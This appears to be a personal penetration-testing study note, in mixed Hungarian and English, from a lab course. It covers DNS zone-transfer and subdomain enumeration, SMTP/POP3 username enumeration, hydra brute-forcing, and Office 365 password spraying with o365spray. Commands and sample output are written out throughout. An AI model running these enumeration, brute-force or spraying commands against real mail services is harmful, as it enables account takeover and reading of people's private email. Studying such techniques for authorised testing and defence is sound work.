# DNS
## dig dns name server helyes megadasa
* ez a helyes forma!!!!!
<pre>
dig inlanefreight.htb @10.129.201.127
dig ns inlanefreight.htb @10.129.201.127
dig any inlanefreight.htb @10.129.201.127
dig axfr inlanefreight.htb @10.129.201.127
</pre>
* ha mashogy csinaljuk siman lehet hogy nem mukodik
* kell a szokoz is a @ elott es kell a @ is mindenkeppen!!! meg utana az ip is!!!
## subbruter.py beallitasa hogy jo legyen
<pre>
$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
$ echo "10.10.10.3" > ./resolvers.txt
$ ./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
</pre>
# dnsenum beallitasa hogy jo legyen
<pre>
$ dnsenum --dnsserver 10.10.10.3 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
</pre>
# SMTP and other email services
## important notes 2 !!!
* Hogyha talalunk valid SMTP usernevet FONTOS, hogy a **TELJES EMAILCIM** az ami kell nekunk sok helyen es nem csak a sima usernev !!!!
  * Pl ha hydra-val akarjuk torni utana, akkor oda a teljes email-t kell megadni usernevnek!!!
  * hydra -l `user1@random.local` -P pass_list.txt -f 10.10.10.3 -I
## important notes !!!
* SMTP-be alapvetoen regen nem lehetett es nem is kellett bejelentkezni
  * arra valo hogy email-t kuldjunk vele es a cimzett mezot on-the-fly adjuk meg mi magunk!!!
  * az smtp-ben nincs is vedelem beepitve erre vonatkozoan
    * igy emiatt a regi idokben siman lehetett spoofolni az smtp level kuldesnek a cimzettet es lehetett vele phising-elni
 * Megoldas az SMTP sender spoofingra
   * A mail server DNS rekordjaiban vannak infok eltarolva (SPF, DKIM, DMARC) es a cimzett azt ellenorzi, hogy a kuldo fel-nel ott vannak e ezek az infok a megfelelo modon beallitva
   * SPF
     * A cimzett megnezi pl hogy arrol a domain-rol jott e a level, ami a sender cim-ben szerepel, ha nem akkor megy a level a spam mappaba
   * DKIM
     * A level header-be belerakunk egy signature-t, es a DNS rekordok koze meg odarakunk egy public key-t es a cimzett le tudja ellenorizni hogy jo e a signature
   * DMARC
     * Ellenorzi hogy az SPF es DKIM rendben vannak e, passzolnak e egymashoz, stb...
   * source: https://www.vaadata.com/blog/phishing-how-to-prevent-email-spoofing/
* Kesobb kiegeszitettek AUTH funkcioval - emiatt van hogy be kell jelentkezni es van hogy nem
  * De igazabol ha be is jelentkezunk nem talalunk leveleket
    * A lenyeg a usernev enumeralas
    * (Meg levelet tudunk kuldeni, de az itt nem fontos nekunk)
* Elvileg az SMTP-ben nem is lesznek eltarolt email-ek, mert az csak a kuldesre hasznalhato
* Nekunk elvileg annyi dolgunk van az SMTP-vel hogy username enumeralast csinalunk!
* POP3-ba kell bejelentkezni, es ha van credential, mert sikerult feltorni, akkor ott megtalalhatjuk a leveleket, ha ugy van beallitva, hogy a serveren maradnak (mert amugy ha mar mas gepen megnyitottak, akkor csak ott lokalisan lesznek meg es mi mar nem tudjuk azokat letolteni a serverrol)
## intro
* Protocols
  * Sending emails - SMTP
  * Opening emails - POP3, IMAP
* Cloud based email solutions are using HTTPS or similar technology
* DNS MX records can help us identify a mail server(s)
* Query information about MX records
  * host, dig
  * online solution: https://mxtoolbox.com/
<pre>
# Host - MX Records
$ host -t MX hackthebox.eu
hackthebox.eu mail is handled by 1 aspmx.l.google.com.
$ host -t MX microsoft.com
microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.

# DIG - MX Records
$ dig mx plaintext.do | grep "MX" | grep -v ";"
plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.

# Host - A Records
$ host -t A mail1.inlanefreight.htb.
mail1.inlanefreight.htb has address 10.129.14.128

# examining results
- microsoft-com.mail.protection.outlook.com. (Cloud based - G-Suite)
- aspmx.l.google.com. (Cloud based - MS 365)
- mx.zoho.com. mx2.zoho.com. mx3.zoho.com. (Cloud based - Zoho)
- mail1.inlanefreight.com. (custom mail server - hosted by the company - OnSite)
</pre>
## common ports
<pre>
TCP/25	SMTP Unencrypted
TCP/143	IMAP4 Unencrypted
TCP/110	POP3 Unencrypted
TCP/465	SMTP Encrypted
TCP/587	SMTP Encrypted/STARTTLS
TCP/993	IMAP4 Encrypted
TCP/995	POP3 Encrypted
</pre>
## scannning
<pre>
$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.10.10.3
</pre>
## enumeration
* Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.
### username enumeration
* first try those that exists on every linux system for sure (like root, www-data, ...)
* commands to enumerate usernames
  * VRFY (check the validity of a particular email username)
    * it can be disabled by the mail server administrator
  * EXPN (similar to VRFY, except that can be used with distribution lists too)
    * when used on distribution list it will list all users on that list
    * try tipical names like 'all', 'support-team', 'dev', ...
  * RCPT (identifies the recipient of the email message)
    * after we define the sender (us), we can define multiple recipient
    * in other words we need to define the sender (us) once and then we can focus on bruteforcing the usernames with the RCPT command (and nothing else needed to be done)
    * in a real word situation all 'found' users are added to the recipient list and if we fill in the message text and send the email - every valid user will get the email
    * POP3 - USER command can be used also
    * smtp-user-enum perl script
#### VRFY
<pre>
# connect to SMTP mail server
$ telnet 10.10.110.20 25
Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

# check user 'root' - found
VRFY root
252 2.0.0 root

# check 'www-data' - found
VRFY www-data
252 2.0.0 www-data

# check random user - 'new-user' - not found
VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
</pre>
#### EXPN
<pre>
# connect to SMTP mail server
$ telnet 10.10.110.20 25
Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

# check user 'john' - found
EXPN john
250 2.1.0 john@inlanefreight.htb

# check distribution list 'support-team' - found (and all users in the group will be listed)
EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
</pre>
#### RCPT
<pre>
# connect to SMTP mail server
$ telnet 10.10.110.20 25
Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

# define the sender (us) (need to be done once)
MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok

# check user 'julio' - not found
RCPT TO:julio
550 5.1.1 julio... User unknown

# check user 'kate' - not found
RCPT TO:kate
550 5.1.1 kate... User unknown

# check user 'john' - found
RCPT TO:john
250 2.1.5 john... Recipient ok
</pre>
#### POP3 - USER command
<pre>
# connect to SMTP mail server
$ telnet 10.10.110.20 110
Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

# check user 'julio' - not found
USER julio
-ERR

# check user 'john' - found
USER john
+OK
</pre>
#### smtp-user-enum perl script
* https://github.com/pentestmonkey/smtp-user-enum
* -M can be: VRFY, EXPN, RCPT
<pre>
$ smtp-user-enum -M RCPT -U users.txt -D domain.com -t 10.10.10.3

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
</pre>
### password attacks
#### cracking passwords
* FONTOS !!!
  * usernevhez az email-t kell megadni!!! es ha user listat hasznalunk, akkor ott is az emailcimnek kell benne lenni nem a sima userneveknek!!!!
<pre>
$ hydra -L users.txt -p 'Company01!' -f 10.10.10.3 pop3
$ hydra -l user1@random.local -P pass_list.txt -f 10.10.10.3 pop3
</pre>
#### login with obtained credentials (we login to POP3)
* **We login to POP3** because all important data are there!!! not in SMTP
* **SMTP is just for userenum**!!
<pre>
# connect to POP3 mail server
$ telnet 10.10.10.3 110 (ha masik porton van a POP3, akkor azt a portot kell megadni)
Trying 10.10.10.3...
Connected to 10.10.10.3.
Escape character is '^]'.
+OK POP3

# login with obtained credentials (**email** and password) (normal username is maybe good maybe not)
USER user1@random.local
+OK Send your password
PASS Password1234
+OK Mailbox locked and ready

# list emails
LIST
+OK 1 messages (601 octets)
1 601
.

# read first email (number after RETR specifies the index of email!!)
RETR 1
+OK 601 octets
Return-Path: marlin@inlanefreight.htb
Received: from [10.10.14.33] (Unknown [10.10.14.33])
	by WINSRV02 with ESMTPA
	; Wed, 20 Apr 2022 14:49:32 -0500
Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
Subject: Password change
From: marlin <marlin@inlanefreight.htb>
To: administrator@inlanefreight.htb
Cc: marlin@inlanefreight.htb
Date: Wed, 20 Apr 2022 15:49:11 -0400
Content-Type: text/plain; charset="UTF-8"
User-Agent: Evolution 3.38.3-1 
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Hi admin,

How can I change my password to something more secure?
...
</pre>
## cloud enumeration (Office 365)
* O365spray - username enumeration and password spraying tool aimed at Microsoft Office 365 (O365)
  * https://github.com/0xZDH/o365spray
<pre>
# validation of the target using O365
$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz

# enumerate usernames
mrFiSHER@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
</pre>
## cloud password attacks
* If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like Hydra, but these tools are usually blocked. We can instead try to use custom tools such as o365spray or MailSniper for Microsoft Office 365 or CredKing for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore.
<pre>
# password spraying attack (trying one specific password for all users)
mrFiSHER@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
</pre>
